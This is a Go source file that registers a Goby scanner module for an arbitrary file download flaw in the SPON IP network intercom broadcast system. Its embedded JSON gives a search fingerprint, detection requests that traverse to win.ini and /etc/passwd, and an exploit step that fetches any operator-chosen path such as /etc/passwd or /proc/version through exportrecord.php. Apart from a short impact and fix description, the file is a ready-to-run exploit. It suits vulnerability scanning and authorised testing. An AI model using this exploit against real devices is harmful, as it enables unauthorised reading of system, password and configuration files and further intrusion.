package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
  "Name": "SPON IP network intercom broadcast system exportrecord.php any file download",
  "Description": "World Bond Communication Co., Ltd. is an audio as the core of the Internet of things solution provider. An arbitrary file reading vulnerability exists in the IP network intercom broadcast system of WorldBond Communication Co., LTD., which can be used by attackers to obtain sensitive information",
  "Product": "SPON IP network intercom broadcast system",
  "Homepage": "https://www.spon.com.cn/",
  "DisclosureDate": "2021-08-24",
  "Author": "luckying1314@139.com",
  "GobyQuery": "body=\"lan/manifest.json\"",
  "Level": "2",
  "Impact": "<p>The vulnerability of arbitrary file download or read is mainly caused by the fact that when the application system provides the function of file download or read, the application system directly specifies the file path in the file path parameter without verifying the validity of the file path. As a result, the attacker can jump through the directory (.. \\ or.. /) to download or read a file beyond the original specified path. The attacker can finally download or read any files on the system through this vulnerability, such as database files, application system source code, password configuration information and other important sensitive information, resulting in sensitive information leakage of the system<br></p>",
  "Recommandation": "<p>Limit ../ The best way is that the file should be in the database for one to one mapping, avoid entering the absolute path to obtain the file<br></p>",
  "References": [],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "filepath",
      "type": "createSelect",
      "value": "../php/exportrecord.php,C:/ICPAS/Wnmp/WWW/php/exportrecord.php,C:/windows/win.ini,/etc/passwd,/proc/version,/home/xc9000/Wnmp/WWW/php/exportrecord.php",
      "show": ""
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "OR",
    {
      "Request": {
        "method": "GET",
        "uri": "/php/exportrecord.php?downname=c:/windows/win.ini",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "[fonts]",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    },
    {
      "Request": {
        "method": "GET",
        "uri": "/php/exportrecord.php?downname=../../../../../etc/passwd",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "root",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/php/exportrecord.php?downname={{{filepath}}}",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "SetVariable": [
        "output|lastbody"
      ]
    }
  ],
  "Tags": [
    "file download"
  ],
  "CVEIDs": null,
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": ["SPON IP network intercom broadcast system"],
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}